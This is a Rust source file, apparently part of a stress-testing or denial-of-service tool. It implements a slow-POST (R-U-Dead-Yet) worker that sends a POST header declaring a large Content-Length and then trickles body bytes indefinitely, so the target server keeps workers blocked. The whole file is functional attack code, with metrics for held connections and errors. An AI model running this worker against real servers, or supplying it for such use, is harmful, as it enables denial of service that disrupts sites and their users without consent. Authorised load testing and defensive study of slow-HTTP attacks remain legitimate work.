//! R-U-Dead-Yet worker (L7).
//!
//! Sends a complete POST header declaring a large `Content-Length`, then
//! trickles the body one byte at a time and never finishes it. The server keeps
//! a worker/thread blocked waiting for a body that never completes. Like
//! slowloris, the signal is `held_connections` and connect-failure rate.

use super::net::Target;
use super::{Governor, HeldGuard, Metrics, Shutdown};
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::AsyncWriteExt;

pub async fn worker(
    idx: u32,
    target: Arc<Target>,
    head: Arc<[u8]>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
    trickle: Duration,
) {
    let mut down = shutdown.subscribe();

    loop {
        if *down.borrow() {
            return;
        }
        if !gov.active(idx) {
            tokio::select! {
                _ = down.changed() => {}
                _ = tokio::time::sleep(Duration::from_millis(100)) => {}
            }
            continue;
        }

        let mut conn = match target.connect().await {
            Ok(c) => c,
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
                tokio::select! {
                    _ = down.changed() => return,
                    _ = tokio::time::sleep(Duration::from_millis(50)) => {}
                }
                continue;
            }
        };
        let _held = HeldGuard::new(&metrics.held_connections);
        metrics.requests_sent.fetch_add(1, Relaxed);

        if conn.write_all(&head).await.is_err() {
            metrics.errors.fetch_add(1, Relaxed);
            continue;
        }
        metrics.bytes_sent.fetch_add(head.len() as u64, Relaxed);

        // Trickle body bytes, never reaching the declared Content-Length.
        'body: loop {
            tokio::select! {
                _ = tokio::time::sleep(trickle) => {}
                _ = down.changed() => return,
            }
            if *down.borrow() {
                return;
            }
            if !gov.active(idx) {
                break 'body;
            }
            if conn.write_all(b"A").await.is_err() {
                metrics.errors.fetch_add(1, Relaxed);
                break 'body;
            }
            metrics.bytes_sent.fetch_add(1, Relaxed);
        }
    }
}
